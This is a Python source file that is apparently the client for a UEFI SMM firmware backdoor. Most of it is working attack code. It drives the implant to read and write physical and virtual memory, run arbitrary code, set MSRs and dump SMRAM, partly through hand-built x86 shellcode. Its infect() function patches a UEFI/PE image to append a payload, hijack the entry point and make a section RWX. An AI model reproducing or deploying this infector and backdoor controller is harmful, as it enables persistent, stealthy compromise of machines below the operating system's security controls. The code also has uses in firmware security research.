#!/usr/bin/env python

import sys, os, platform, time, shutil, unittest, mmap, ctypes
from ctypes import *
from struct import pack, unpack, calcsize
from optparse import OptionParser, make_option

# SW SMI command value for communicating with backdoor SMM code
BACKDOOR_SW_SMI_VAL = 0xCC

#
# backdoor CTL commands
#
BACKDOOR_CTL_PING           = 0x00  # check if backdoor is alive
BACKDOOR_CTL_INFO           = 0x01  # return backdoor information
BACKDOOR_CTL_READ_PHYS      = 0x02  # read physical memory
BACKDOOR_CTL_READ_VIRT      = 0x03  # read virtual memory
BACKDOOR_CTL_WRITE_PHYS     = 0x04  # write physical memory
BACKDOOR_CTL_WRITE_VIRT     = 0x05  # write virtual memory
BACKDOOR_CTL_EXECUTE        = 0x06  # execute code at given address
BACKDOOR_CTL_MSR_GET        = 0x07  # get MSR value
BACKDOOR_CTL_MSR_SET        = 0x08  # set MSR value
BACKDOOR_CTL_STATE_GET      = 0x09  # get saved state register value
BACKDOOR_CTL_STATE_SET      = 0x0a  # set saved state register value
BACKDOOR_CTL_GET_PHYS_ADDR  = 0x0b  # translate virtual address to physical
BACKDOOR_CTL_TIMER_ENABLE   = 0x0c  # enable periodic timer software SMI
BACKDOOR_CTL_TIMER_DISABLE  = 0x0d  # disable periodic timer software SMI
BACKDOOR_CTL_FIND_VMCS      = 0x0e  # find potential VMCS region

#
# Magic register values to communicate with the backdoor using
# periodic timer software SMI handler
#
TIMER_R8_VAL = 0xfe4020d4e8fa6c4d
TIMER_R9_VAL = 0xd344171e43eafc19

# how many cycles to wait for the periodic timer software SMI
TIMER_RETRY = 0x400000000

#
# EFI_SMM_CPU_PROTOCOL save state register numbers
#
SMM_SAVE_STATE_GDTBASE      = 4
SMM_SAVE_STATE_IDTBASE      = 5
SMM_SAVE_STATE_LDTBASE      = 6
SMM_SAVE_STATE_GDTLIMIT     = 7
SMM_SAVE_STATE_IDTLIMIT     = 8
SMM_SAVE_STATE_LDTLIMIT     = 9
SMM_SAVE_STATE_LDTINFO      = 10
SMM_SAVE_STATE_ES           = 20
SMM_SAVE_STATE_CS           = 21
SMM_SAVE_STATE_SS           = 22
SMM_SAVE_STATE_DS           = 23
SMM_SAVE_STATE_FS           = 24
SMM_SAVE_STATE_GS           = 25
SMM_SAVE_STATE_LDTR_SEL     = 26
SMM_SAVE_STATE_TR_SEL       = 27
SMM_SAVE_STATE_DR7          = 28
SMM_SAVE_STATE_DR6          = 29
SMM_SAVE_STATE_R8           = 30
SMM_SAVE_STATE_R9           = 31
SMM_SAVE_STATE_R10          = 32
SMM_SAVE_STATE_R11          = 33
SMM_SAVE_STATE_R12          = 34
SMM_SAVE_STATE_R13          = 35
SMM_SAVE_STATE_R14          = 36
SMM_SAVE_STATE_R15          = 37  
SMM_SAVE_STATE_RAX          = 38
SMM_SAVE_STATE_RBX          = 39
SMM_SAVE_STATE_RCX          = 40
SMM_SAVE_STATE_RDX          = 41
SMM_SAVE_STATE_RSP          = 42
SMM_SAVE_STATE_RBP          = 43
SMM_SAVE_STATE_RSI          = 44
SMM_SAVE_STATE_RDI          = 45
SMM_SAVE_STATE_RIP          = 46
SMM_SAVE_STATE_RFLAGS       = 51
SMM_SAVE_STATE_CR0          = 52
SMM_SAVE_STATE_CR3          = 53
SMM_SAVE_STATE_CR4          = 54

# See struct _INFECTOR_CONFIG in SmmBackdoor.h
INFECTOR_CONFIG_SECTION = '.conf'
INFECTOR_CONFIG_FMT = 'QQQQQ'
INFECTOR_CONFIG_LEN = 8 + 8 + 8 + 8 + 8

# IMAGE_DOS_HEADER.e_res magic constant to mark infected file
INFECTOR_SIGN = 'INFECTED'

# EFI variable with debug output buffer address
BACKDOOR_VAR = 'SmmBackdoorInfo-0cacdf34-ee00-4230-af5d-8bae0072cbea'

PAGE_SHIFT = 12
PAGE_SIZE  = 0x1000
PAGE_MASK  = 0xfffffffffffff000

DEBUG_OUTPUT_SIZE = PAGE_SIZE * 0x10

PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40

MEM_COMMIT  = 0x1000      
MEM_RESERVE = 0x2000   
MEM_RELEASE = 0x8000

align_up = lambda x, a: ((x + a - 1) // a) * a
align_down = lambda x, a: (x // a) * a

is_win32 = lambda: sys.platform == 'win32'

cs = None
stub_addr = None


if is_win32():

    # check for WoW64 in case of Windows
    if platform.architecture()[0] != '64bit':

        print('ERROR: WoW64 is not supported')
        exit()


class Singleton(type):

    _instances = {}
    
    def __call__(self, *args, **kwargs):

        if self not in self._instances:

            # create new instance
            self._instances[self] = super(Singleton, self).__call__(*args, **kwargs)
        
        return self._instances[self]


class ChipsecWrapper(object):

    __metaclass__ = Singleton

    class NoSuchVariable(Exception):

        pass

    def __init__(self):

        try:

            import chipsec.chipset
            import chipsec.hal.uefi
            import chipsec.hal.physmem
            import chipsec.hal.interrupts

        except ImportError:

            print('ERROR: chipsec is not installed')
            exit(-1)

        self.cs = chipsec.chipset.cs()
        
        # load chipsec helper
        self.cs.helper.start(True)
    
        # load needed sumbmodules
        self.intr = chipsec.hal.interrupts.Interrupts(self.cs)
        self.uefi = chipsec.hal.uefi.UEFI(self.cs)        
        self.mem = chipsec.hal.physmem.Memory(self.cs)

    def efi_var_get(self, var_name):

        # parse variable name string of name-GUID format
        name = var_name.split('-')

        # get variable data
        data = self.uefi.get_EFI_variable(name[0], '-'.join(name[1: ]), None)
        if data is None or len(data) == 0:

            raise(self.NoSuchVariable('Unable to query NVRAM variable %s' % var_name))

        return data

    efi_var_get_8 = lambda self, name: unpack('B', self.efi_var_get(name))[0]
    efi_var_get_16 = lambda self, name: unpack('H', self.efi_var_get(name))[0]
    efi_var_get_32 = lambda self, name: unpack('I', self.efi_var_get(name))[0]
    efi_var_get_64 = lambda self, name: unpack('Q', self.efi_var_get(name))[0]

    def mem_read(self, addr, size): 

        # read memory contents
        return self.mem.read_physical_mem(addr, size)

    def mem_write(self, addr, data): 

        # write memory contents
        return self.mem.write_physical_mem(addr, len(data), data)

    mem_read_8 = lambda self, addr: unpack('B', self.mem_read(addr, 1))[0]
    mem_read_16 = lambda self, addr: unpack('H', self.mem_read(addr, 2))[0]
    mem_read_32 = lambda self, addr: unpack('I', self.mem_read(addr, 4))[0]
    mem_read_64 = lambda self, addr: unpack('Q', self.mem_read(addr, 8))[0]

    mem_write_1 = lambda self, addr, v: self.mem_write(addr, pack('B', v))
    mem_write_2 = lambda self, addr, v: self.mem_write(addr, pack('H', v))
    mem_write_4 = lambda self, addr, v: self.mem_write(addr, pack('I', v))
    mem_write_8 = lambda self, addr, v: self.mem_write(addr, pack('Q', v))

    def send_sw_smi(self, code, data, rax = 0, rbx = 0, rcx = 0, rdx = 0, rsi = 0, rdi = 0):

        # fire synchronous SMI
        self.intr.send_SW_SMI(0, code, data, rax, rbx, rcx, rdx, rsi, rdi)


# class that inherits mmap.mmap and has the page address
class Mmap(mmap.mmap):

    class PyObj(Structure):

        _fields_ = [( 'ob_refcnt', c_size_t ),
                    ( 'ob_type', c_void_p )]

    # ctypes object for introspection
    class PyMmap(PyObj):

        _fields_ = [( 'ob_addr', c_size_t )]

    def __init__(self, *args, **kwarg):

        # get the page address by introspection of the native structure
        self.mem = self.PyMmap.from_address(id(self))
        self.old = None

        if is_win32():
            
            kernel32 = ctypes.windll.kernel32

            # fix return type of VirtualAlloc()
            kernel32.VirtualAlloc.restype = ctypes.c_void_p

            # remeber original address
            self.old = self.mem.ob_addr

            # allocate reguler (not mapped) virtual memory
            self.mem.ob_addr = kernel32.VirtualAlloc(0,
                                                     args[1],
                                                     MEM_COMMIT | MEM_RESERVE,
                                                     PAGE_READWRITE)   

            assert self.mem.ob_addr is not None 

        # get address of allocated memory
        self.addr = self.mem.ob_addr

    def close(self):

        if self.old is not None:

            # restore original address
            self.mem.ob_addr = self.old

            kernel32 = ctypes.windll.kernel32            

            # free allocated memory
            kernel32.VirtualFree(ctypes.c_void_p(self.addr), 0, MEM_RELEASE)

        super(Mmap, self).close()

    def __del__(self):

        # close mmap object to free allocated memory
        self.close()


def mem_alloc(size):

    if is_win32():

        # on Windows mmap() has different arguments
        return Mmap(-1, size, 'w')

    else:

        return Mmap(-1, size, mmap.PROT_WRITE)


class BackdoorControl(object):

    # initial value for BACKDOOR_CTL.Status
    STATUS_NONE = 0xffffffffffffffff

    EFI_SUCCESS             = 0
    EFI_INVALID_PARAMETER   = (1 << 63) | 2
    EFI_NOT_FOUND           = (1 << 63) | 14
    EFI_NO_MAPPING          = (1 << 63) | 17    

    class NoBackdoor(Exception):

        pass

    class BadArguments(Exception):

        pass

    class BadAddress(Exception):

        pass

    class BadVirtualAddress(Exception):

        pass

    class Info(object):

        MAX_SMRAM_REGIONS = 0x10

        def __init__(self, bd):

            self.smram = []

            # get basic information
            self.cr0, self.cr3, self.smst = bd._ctl_get('QQQ')

            for i in range(0, self.MAX_SMRAM_REGIONS):

                # obtain BACKDOOR_SMRAM_REGION
                addr, size = bd._ctl_get('QQ')
                if addr == 0 or size == 0:

                    # end of the list
                    break

                self.smram.append(( addr, size ))

    def __init__(self, cs):        

        # allocate test memory pages
        self.mem = mem_alloc(PAGE_SIZE)
        self.stub_addr = None
        self.cs = cs

    def _setaffinity(self, mask):

        if is_win32():

            kernel32 = ctypes.windll.kernel32

            CURRENT_THREAD = ctypes.c_void_p(-2)

            # execute SetThreadAffinityMask() 
            kernel32.SetThreadAffinityMask(CURRENT_THREAD, mask);

        else:

            # load libc
            libc = ctypes.cdll.LoadLibrary('libc.so.6')

            mask = ctypes.c_ulong(mask)

            # execute sched_setaffinity()
            libc.sched_setaffinity(0, ctypes.sizeof(ctypes.c_ulong), ctypes.pointer(mask))

    def _ctl_get(self, format, *args):

        # read BACKDOOR_CTL structure contents
        return unpack(format, self.mem.read(calcsize(format)))

    def _ctl_set(self, format, *args):        

        self.mem.seek(0)

        # write BACKDOOR_CTL structure contents        
        self.mem.write(pack(format, *args))
        self.mem.write('\0' * (PAGE_SIZE - calcsize(format)))

        self.mem.seek(0)    

    def _ctl_send_timer(self, ctl, arg):        

        #
        # Construct the code to call SMM backdoor using
        # periodic timer SW SMI
        #
        code =  '\x51'                                  # push    rcx
        code += '\x52'                                  # push    rdx
        code += '\x57'                                  # push    rdi
        code += '\x56'                                  # push    rsi
        code += '\x41\x50'                              # push    r8
        code += '\x41\x51'                              # push    r9
        code += '\x48\xbf' + pack('Q', ctl)             # mov     rdi, ctl
        code += '\x48\xbe' + pack('Q', arg)             # mov     rsi, arg
        code += '\xe8\x00\x00\x00\x00'                  # call    $+5
        code += '\x59'                                  # pop     rcx
        code += '\x48\x83\xc1\x23'                      # add     rcx, 35
        code += '\x48\xba' + pack('Q', TIMER_RETRY)     # mov     rdx, TIMER_RETRY
        code += '\x49\xb8' + pack('Q', TIMER_R8_VAL)    # mov     r8, MAGIC_R8_VAL
        code += '\x49\xb9' + pack('Q', TIMER_R9_VAL)    # mov     r9, MAGIC_R9_VAL
        code += '\x48\xff\xca'                          # dec     rdx
        code += '\x74\x02'                              # jz      $+4
        code += '\xff\xe1'                              # jmp     rcx
        code += '\x41\x59'                              # pop     r9
        code += '\x41\x58'                              # pop     r8
        code += '\x5e'                                  # pop     rsi
        code += '\x5f'                                  # pop     rdi
        code += '\x5a'                                  # pop     rdx
        code += '\x59'                                  # pop     rcx
        code += '\xc3'                                  # ret

        if is_win32():

            kernel32 = ctypes.windll.kernel32

            # fix return type of VirtualAlloc()
            kernel32.VirtualAlloc.restype = ctypes.c_void_p

            # allocate executable memory page
            stub_addr = kernel32.VirtualAlloc(0,
                                              PAGE_SIZE,
                                              MEM_COMMIT | MEM_RESERVE,
                                              PAGE_EXECUTE_READWRITE)
            assert stub_addr is not None

            kernel32.RtlCopyMemory(ctypes.c_void_p(stub_addr), 
                                   ctypes.create_string_buffer(code), len(code))
        else:

            # allocate executable memory page
            stub = Mmap(-1, PAGE_SIZE, prot = mmap.PROT_WRITE | mmap.PROT_EXEC,
                                       flags = mmap.MAP_ANON | mmap.MAP_PRIVATE)

            stub.write(code)            
            stub_addr = stub.addr

        # execute current process only on 1-st CPU
        self._setaffinity(1)

        # pass execution to the generated code
        func = ctypes.CFUNCTYPE(None)(stub_addr)
        func()

        if is_win32():

            # free memory page
            kernel32.VirtualFree(ctypes.c_void_p(stub_addr), 0, MEM_RELEASE)

    def _ctl_send_smi(self, code, args):

        # send backdoor control request
        self.cs.send_sw_smi(BACKDOOR_SW_SMI_VAL, code, rcx = args)

    def _ctl_send(self, code):

        if self.cs is None:

            # send backdoor control request using periodic timer
            self._ctl_send_timer(code, self.mem.addr)

        else:

            # send backdoor control request using software SMI
            self._ctl_send_smi(code, self.mem.addr)

        status = self._ctl_get('Q')[0]

        # check reply status
        if status == self.STATUS_NONE:

            raise(self.NoBackdoor('Backdoor is not present'))

        return status

    def ping(self):

        # set input arguments
        self._ctl_set('Q', self.STATUS_NONE)

        # perform request
        assert self._ctl_send(BACKDOOR_CTL_PING) == 0

    def info(self):

        # set input arguments
        self._ctl_set('Q', self.STATUS_NONE)

        # perform request
        assert self._ctl_send(BACKDOOR_CTL_INFO) == 0

        # read information
        return self.Info(self)

    def _check_mem_status(self, status):

        if status == self.EFI_INVALID_PARAMETER:

            # invalid arguments passed to the backdoor request
            raise(self.BadArguments('Backdoor request bad arguments'))

        elif status == self.EFI_NO_MAPPING:

            # bad buffer address passed to the backdoor request
            raise(self.BadAddress('Backdoor request bad buffer address'))

        elif status == self.EFI_NOT_FOUND:

            # bad target virtual address passed to the backdoor request
            raise(self.BadVirtualAddress('Backdoor request bad virtual address'))

        return status

    def _write_mem(self, code, addr, data):

        size = len(data)

        assert size <= PAGE_SIZE and size > 0
        assert (addr & PAGE_MASK) == ((addr + size - 1) & PAGE_MASK)

        # allocate data buffer
        buff = mem_alloc(PAGE_SIZE)
        
        buff.write(data)
        buff.write('\0' * (PAGE_SIZE - size))

        # set input arguments
        self._ctl_set('QQQQ', self.STATUS_NONE, addr, size, buff.addr)

        # perform request
        assert self._check_mem_status(self._ctl_send(code)) == self.EFI_SUCCESS

    def _read_mem(self, code, addr, size):

        assert size <= PAGE_SIZE and size > 0
        assert (addr & PAGE_MASK) == ((addr + size - 1) & PAGE_MASK)

        # allocate data buffer
        buff = mem_alloc(PAGE_SIZE)
        
        buff.write('\0' * PAGE_SIZE)
        buff.seek(0)

        # set input arguments
        self._ctl_set('QQQQ', self.STATUS_NONE, addr, size, buff.addr)

        # perform request
        assert self._check_mem_status(self._ctl_send(code)) == self.EFI_SUCCESS

        # get readed data
        return buff.read(size)

    def write_phys_mem(self, addr, data):

        return self._write_mem(BACKDOOR_CTL_WRITE_PHYS, addr, data)

    def read_phys_mem(self, addr, size):

        return self._read_mem(BACKDOOR_CTL_READ_PHYS, addr, size)

    def write_virt_mem(self, addr, data):

        return self._write_mem(BACKDOOR_CTL_WRITE_VIRT, addr, data)

    def read_virt_mem(self, addr, size):

        return self._read_mem(BACKDOOR_CTL_READ_VIRT, addr, size)

    def execute(self, addr):

        # set input arguments
        self._ctl_set('QQ', self.STATUS_NONE, addr)

        # perform request
        assert self._ctl_send(BACKDOOR_CTL_EXECUTE) == 0

    def msr_get(self, reg):

        # set input arguments
        self._ctl_set('QQQ', self.STATUS_NONE, reg, 0)

        # perform request
        assert self._ctl_send(BACKDOOR_CTL_MSR_GET) == 0

        _, val = self._ctl_get('QQ')

        return val

    def msr_set(self, reg, val):

        # set input arguments
        self._ctl_set('QQQ', self.STATUS_NONE, reg, val)

        # perform request
        assert self._ctl_send(BACKDOOR_CTL_MSR_SET) == 0

    def state_get(self, reg):

        # set input arguments
        self._ctl_set('QQQ', self.STATUS_NONE, reg, 0)

        # perform request
        assert self._ctl_send(BACKDOOR_CTL_STATE_GET) == 0

        _, val = self._ctl_get('QQ')

        return val

    def state_set(self, reg, val):

        # set input arguments
        self._ctl_set('QQQ', self.STATUS_NONE, reg, val)

        # perform request
        assert self._ctl_send(BACKDOOR_CTL_STATE_SET) == 0

    def timer_enable(self):

        # enable periodic timer SW SMI
        self._ctl_send_smi(BACKDOOR_CTL_TIMER_ENABLE, 0)

    def timer_disable(self):

        # disable periodic timer SW SMI
        self._ctl_send_smi(BACKDOOR_CTL_TIMER_DISABLE, 0)

    def get_phys_addr(self, addr_virt, cr3 = 0, eptp = 0):

        eptp = 1 if eptp is None else eptp

        # set input arguments
        self._ctl_set('QQQQQ', self.STATUS_NONE, addr_virt, 0, eptp, cr3)

        # perform request
        if self._ctl_send(BACKDOOR_CTL_GET_PHYS_ADDR) != 0:

            # unable to translate virtual to physical
            return None

        _, addr_phys = self._ctl_get('QQ')

        return addr_phys

    def find_vmcs(self, addr, size = None):

        # set input arguments
        self._ctl_set('QQQQ', self.STATUS_NONE, addr, PAGE_SIZE if size is None else size, 0)

        # perform request
        if self._ctl_send(BACKDOOR_CTL_FIND_VMCS) != 0:

            # unable to locate VMCS within specified memory region
            return None

        _, _, vmcs_addr = self._ctl_get('QQQ')

        return vmcs_addr if vmcs_addr != 0 else None


def infect(src, payload, dst = None):

    try:

        import pefile

    except ImportError:

        print('ERROR: pefile is not installed')
        exit(-1)

    def _infector_config_offset(pe):
        
        for section in pe.sections:

            # find .conf section of payload image
            if section.Name[: len(INFECTOR_CONFIG_SECTION)] == INFECTOR_CONFIG_SECTION:

                return section.PointerToRawData

        raise Exception('Unable to find %s section' % INFECTOR_CONFIG_SECTION)

    def _infector_config_get(pe, data):

        offs = _infector_config_offset(pe)
        
        return unpack(INFECTOR_CONFIG_FMT, data[offs : offs + INFECTOR_CONFIG_LEN])        

    def _infector_config_set(pe, data, *args):

        offs = _infector_config_offset(pe)

        return data[: offs] + \
               pack(INFECTOR_CONFIG_FMT, *args) + \
               data[offs + INFECTOR_CONFIG_LEN :]

    # load target image
    pe_src = pefile.PE(src)

    # load payload image
    pe_payload = pefile.PE(payload)
    
    if pe_src.DOS_HEADER.e_res == INFECTOR_SIGN:

        raise Exception('%s is already infected' % src)        

    if pe_src.FILE_HEADER.Machine != pe_payload.FILE_HEADER.Machine:

        raise Exception('Architecture missmatch')

    # read payload image data into the string
    data = open(payload, 'rb').read()

    # read _INFECTOR_CONFIG, this structure is located at .conf section of payload image
    val_1, val_2, val_3, conf_ep_new, conf_ep_old = _infector_config_get(pe_payload, data) 

    last_section = None
    for section in pe_src.sections:

        # find last section of target image
        last_section = section

    if last_section.Misc_VirtualSize > last_section.SizeOfRawData:

        raise Exception('Last section virtual size must be less or equal than raw size')

    # save original entry point address of target image
    conf_ep_old = pe_src.OPTIONAL_HEADER.AddressOfEntryPoint

    print('Original entry point RVA is 0x%.8x' % conf_ep_old )
    print('Original %s virtual size is 0x%.8x' % \
          (last_section.Name.split('\0')[0], last_section.Misc_VirtualSize))

    print('Original image size is 0x%.8x' % pe_src.OPTIONAL_HEADER.SizeOfImage)

    # write updated _INFECTOR_CONFIG back to the payload image
    data = _infector_config_set(pe_payload, data, val_1, val_2, val_3, conf_ep_new, conf_ep_old)

    # set new entry point of target image
    pe_src.OPTIONAL_HEADER.AddressOfEntryPoint = \
        last_section.VirtualAddress + last_section.SizeOfRawData + conf_ep_new    

    # update last section size
    last_section.SizeOfRawData += len(data)
    last_section.Misc_VirtualSize = last_section.SizeOfRawData

    # make it executable
    last_section.Characteristics = pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_READ'] | \
                                   pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_WRITE'] | \
                                   pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE']  

    print('Characteristics of %s section was changed to RWX' % last_section.Name.split('\0')[0])

    # update image headers
    pe_src.OPTIONAL_HEADER.SizeOfImage = last_section.VirtualAddress + last_section.Misc_VirtualSize
    pe_src.DOS_HEADER.e_res = INFECTOR_SIGN    

    print('New entry point RVA is 0x%.8x' % pe_src.OPTIONAL_HEADER.AddressOfEntryPoint)
    print('New %s virtual size is 0x%.8x' % \
          (last_section.Name.split('\0')[0], last_section.Misc_VirtualSize))

    print('New image size is 0x%.8x' % pe_src.OPTIONAL_HEADER.SizeOfImage)

    # get infected image data
    data = pe_src.write() + data

    if dst is not None:

        with open(dst, 'wb') as fd:

            # save infected image to the file
            fd.write(data)

    return data


def hexdump(data, width = 16, addr = 0):

    ret = ''

    def quoted(data):

        # replace non-alphanumeric characters
        return ''.join(map(lambda b: b if b.isalnum() else '.', data))

    while data:

        line = data[: width]
        data = data[width :]

        # put hex values
        s = map(lambda b: '%.2x' % ord(b), line)
        s += [ '  ' ] * (width - len(line))

        # put ASCII values
        s = '%s | %s' % (' '.join(s), quoted(line))

        if addr is not None:

            # put address
            s = '%.8x: %s' % (addr, s)
            addr += len(line)

        ret += s + '\n'

    return ret


def init(use_timer = False):

    global cs    

    if cs is None and not use_timer:
    
        # initialize chipsec
        cs = ChipsecWrapper()

    else:

        cs = None


def backdoor_debug_print():

    assert cs is not None

    print('[+] Obtaining backdoor debug information...')

    try:

        # get debug messages buffer address
        addr = cs.efi_var_get_64(BACKDOOR_VAR)

    except cs.NoSuchVariable, e:

        print('ERROR: ' + str(e))
        return

    print('[+] Debug output buffer physical address is 0x%x' % addr)

    # read debug output
    data = cs.mem_read(addr, DEBUG_OUTPUT_SIZE)
    data = data.split('\0')[0]

    num = 1

    print('')

    # print debug output to the console
    for line in data.split('\r\n'):

        line = line.strip()
        if len(line) > 0:

            print('%.8d - %s' % (num, line))
            num += 1

    print('')


def backdoor_debug_flush():

    assert cs is not None

    print('[+] Obtaining backdoor debug information...')

    try:

        # get debug messages buffer address
        addr = cs.efi_var_get_64(BACKDOOR_VAR)

    except cs.NoSuchVariable, e:

        print('ERROR: ' + str(e))
        return

    print('[+] Debug output buffer physical address is 0x%x' % addr)

    # erase debug output
    cs.mem_write(addr, '\0' * DEBUG_OUTPUT_SIZE)

    print('[+] Debug output buffer was erased')


def backdoor_test():

    bd = BackdoorControl(cs)

    print('[+] Checking if SMM backdoor is present...')

    # check if backdoor is present
    bd.ping()

    print('[+] Obtaining information...')

    # get backdoor info
    info = bd.info()    

    print('')
    print('  CR0 = 0x%x' % info.cr0)
    print('  CR3 = 0x%x' % info.cr3)
    print(' SMST = 0x%x' % info.smst)
    print('')

    if len(info.smram) > 0:

        print('[+] SMRAM regions:\n')

        for region_addr, region_size in info.smram:

            print(' * 0x%.8x:%.8x' % (region_addr, region_addr + region_size - 1))

        print('')


def execute(addr):

    bd = BackdoorControl(cs)

    # execute code at given address
    bd.execute(addr)


def msr_get(reg):

    bd = BackdoorControl(cs)

    return bd.msr_get(reg)


def msr_set(reg, val):

    bd = BackdoorControl(cs)

    bd.msr_set(reg, val)


def state_get(reg):

    bd = BackdoorControl(cs)

    return bd.state_get(reg)


def state_set(reg, val):

    bd = BackdoorControl(cs)

    bd.state_set(reg, val)


def timer_enable():

    bd = BackdoorControl(cs)

    bd.timer_enable()


def timer_disable():

    bd = BackdoorControl(cs)

    bd.timer_disable()


def get_phys_addr(addr_virt, cr3 = 0, eptp = 0):

    bd = BackdoorControl(cs)

    return bd.get_phys_addr(addr_virt, cr3 = cr3, eptp = eptp)


def find_vmcs(addr, size = None):

    bd = BackdoorControl(cs)

    return bd.find_vmcs(addr, size = size)


def smram_info():

    bd = BackdoorControl(cs)

    # get backdoor information
    info = bd.info()

    # return SMRAM regions list
    return info.smram


def ping():

    bd = BackdoorControl(cs)

    # check if backdoor is present
    bd.ping()


def smram_dump():        

    bd = BackdoorControl(cs)

    # get SMRAM information
    regions, contents = smram_info(), []
    regions_merged = []

    if len(regions) > 1:

        # join neighbour regions
        for i in range(0, len(regions) - 1):

            curr_addr, curr_size = regions[i]
            next_addr, next_size = regions[i + 1]

            if curr_addr + curr_size == next_addr:

                # join two regions
                regions[i + 1] = ( curr_addr, curr_size + next_size )

            else:

                # copy region information
                regions_merged.append(( curr_addr, curr_size ))

        region_addr, region_size = regions[-1]
        regions_merged.append(( region_addr, region_size ))

    elif len(regions) > 0:

        regions_merged = regions

    else:

        raise(Exception('No SMRAM regions found'))

    print('[+] Dumping SMRAM regions, this may take a while...')

    try:

        # enumerate and dump available SMRAM regions
        for region in regions_merged: 
            
            region_addr, region_size = region            
            name = 'SMRAM_dump_%.8x_%.8x.bin' % (region_addr, region_addr + region_size - 1)
            data = ''
            
            for i in range(0, region_size / PAGE_SIZE):

                # dump region contents
                data += bd.read_phys_mem(region_addr + (i * PAGE_SIZE), PAGE_SIZE)

            contents.append(( name, data ))

        # save dumped data to files
        for name, data in contents:

            with open(name, 'wb') as fd:

                print('[+] Creating %s' % name)
                fd.write(data) 

    except IOError, why:

        print('ERROR: %s' % str(why))
        return False

    return True


def _backdoor_read_mem(addr, size, virt = False):

    data = ''

    bd = BackdoorControl(cs)
    
    # perform memory reads
    while size > 0:

        # calculate chunk length to not cross page boundary
        chunk_size = PAGE_SIZE if addr & 0xfff == 0 else (align_up(addr, PAGE_SIZE) - addr)
        chunk_size = min(size, chunk_size)

        if virt:

            # virtual memory read operation
            data += bd.read_virt_mem(addr, chunk_size)

        else:

            # physical memory read operation
            data += bd.read_phys_mem(addr, chunk_size)

        size -= chunk_size
        addr += chunk_size

    return data


def _backdoor_write_mem(addr, data, virt = False):

    size = len(data)

    bd = BackdoorControl(cs)
    
    # perform memory reads
    while size > 0:

        # calculate chunk length to not cross page boundary
        chunk_size = PAGE_SIZE if addr & 0xfff == 0 else (align_up(addr, PAGE_SIZE) - addr)
        chunk_size = min(size, chunk_size)

        # data chunk to write
        chunk = data[len(data) - size : len(data) - size + chunk_size]

        if virt:

            # virtual memory write operation
            bd.write_virt_mem(addr, chunk)

        else:

            # physical memory write operation
            bd.write_phys_mem(addr, chunk)

        size -= chunk_size
        addr += chunk_size


def read_phys_mem(addr, size):

    return _backdoor_read_mem(addr, size, virt = False)

def write_phys_mem(addr, data):

    _backdoor_write_mem(addr, data, virt = False)

def read_phys_mem_1(addr): 

    return unpack('B', read_phys_mem(addr, 1))[0]

def read_phys_mem_2(addr): 

    return unpack('H', read_phys_mem(addr, 2))[0]

def read_phys_mem_4(addr): 

    return unpack('I', read_phys_mem(addr, 4))[0]

def read_phys_mem_8(addr): 

    return unpack('Q', read_phys_mem(addr, 8))[0]

def write_phys_mem_1(addr, val): 

    write_phys_mem(addr, pack('B', val))

def write_phys_mem_2(addr, val): 

    write_phys_mem(addr, pack('H', val))

def write_phys_mem_4(addr, val): 

    write_phys_mem(addr, pack('I', val))

def write_phys_mem_8(addr, val): 

    write_phys_mem(addr, pack('Q', val))


def read_virt_mem(addr, size, cr3 = 0, eptp = 0):

    if cr3 != 0:

        # do the manual address translation
        addr_phys = get_phys_addr(addr, cr3 = cr3, eptp = eptp)

        return read_phys_mem(addr_phys, size)

    else:

        # backdoor will do the address translation by itself
        return _backdoor_read_mem(addr, size, virt = True)

def write_virt_mem(addr, data, cr3 = 0, eptp = 0):

    if cr3 != 0:

        # do the manual address translation
        addr_phys = get_phys_addr(addr, cr3 = cr3, eptp = eptp)

        write_phys_mem(addr_phys, data)

    else:

        # backdoor will do the address translation by itself
        _backdoor_write_mem(addr, data, virt = True)

def read_virt_mem_1(addr, cr3 = 0, eptp = 0): 

    return unpack('B', read_virt_mem(addr, 1, cr3 = cr3, eptp = eptp))[0]

def read_virt_mem_2(addr, cr3 = 0, eptp = 0): 

    return unpack('H', read_virt_mem(addr, 2, cr3 = cr3, eptp = eptp))[0]

def read_virt_mem_4(addr, cr3 = 0, eptp = 0): 

    return unpack('I', read_virt_mem(addr, 4, cr3 = cr3, eptp = eptp))[0]

def read_virt_mem_8(addr, cr3 = 0, eptp = 0): 

    return unpack('Q', read_virt_mem(addr, 8, cr3 = cr3, eptp = eptp))[0]

def write_virt_mem_1(addr, val, cr3 = 0, eptp = 0): 

    write_virt_mem(addr, pack('B', val), cr3 = cr3, eptp = eptp)

def write_virt_mem_2(addr, val, cr3 = 0, eptp = 0): 

    write_virt_mem(addr, pack('H', val), cr3 = cr3, eptp = eptp)

def write_virt_mem_4(addr, val, cr3 = 0, eptp = 0): 

    write_virt_mem(addr, pack('I', val), cr3 = cr3, eptp = eptp)

def write_virt_mem_8(addr, val, cr3 = 0, eptp = 0): 

    write_virt_mem(addr, pack('Q', val), cr3 = cr3, eptp = eptp)


class TestPhysMemAccess(unittest.TestCase):

    def __init__(self, method):

        init()

        super(TestPhysMemAccess, self).__init__(method)

    def smram_start(self):
        ''' Get address of the first SMRAM region. '''

        return smram_info()[0][0]

    def test_mem(self):
        ''' Test regular memory read/write operations. '''

        addr = self.smram_start()

        data = read_phys_mem(addr, 0x20)

        write_phys_mem(addr, data)

    def test_normal(self, addr = None):
        ''' Test byte/word/dword/qword memory operations. '''

        addr = self.smram_start() if addr is None else addr

        val = 0x0102030405060708

        old = read_phys_mem_8(addr)

        write_phys_mem_8(addr, val)

        assert read_phys_mem_1(addr) == val & 0xff
        assert read_phys_mem_2(addr) == val & 0xffff
        assert read_phys_mem_4(addr) == val & 0xffffffff
        assert read_phys_mem_8(addr) == val

        write_phys_mem_8(addr, old)

    def test_unaligned(self, addr = None):
        ''' Test unaligned memory operations. '''

        addr = self.smram_start() if addr is None else addr

        val = int(time.time())

        old = read_phys_mem_8(addr)

        write_phys_mem_8(addr, 0)
        write_phys_mem_4(addr + 1, val)

        assert read_phys_mem_8(addr) == val << 8

        write_phys_mem_8(addr, 0)
        write_phys_mem_4(addr + 2, val)

        assert read_phys_mem_8(addr) == val << 16

        write_phys_mem_8(addr, 0)
        write_phys_mem_4(addr + 3, val)

        assert read_phys_mem_8(addr) == val << 24

        write_phys_mem_8(addr, old)

    def test_cross_page(self):
        ''' Test cross page boundary memory operations. '''

        addr = self.smram_start() + PAGE_SIZE

        self.test_normal(addr = addr - 1)
        
        self.test_unaligned(addr = addr - 2)

